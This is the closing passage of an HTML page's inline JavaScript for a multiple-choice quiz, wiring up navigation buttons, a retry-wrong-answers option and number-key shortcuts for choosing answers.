  $('next').addEventListener('click',() => {
    if (!Object.hasOwn(state.responses,state.order[state.index])) return;
    if (state.index === state.order.length-1) results();
    else { state = core.move(state,1); save(); renderQuestion(); }
  });
  $('back-results').addEventListener('click',results);
  $('retry-wrong').addEventListener('click',() => {
    const ids = core.score(state,byId).wrongIds;
    if (ids.length) start(['A','B','C'],ids,state.randomOrder);
  });
  document.addEventListener('keydown',event => {
    if (screen !== 'quiz' || event.repeat || event.altKey || event.ctrlKey || event.metaKey || event.isComposing || /INPUT|TEXTAREA|SELECT/.test(event.target.tagName)) return;
    if (/^[1-4]$/.test(event.key)) { event.preventDefault(); choose('ABCD'[Number(event.key)-1]); }
  });
  updateSelected(); home(false);
})();
</script>
</body>
</html>
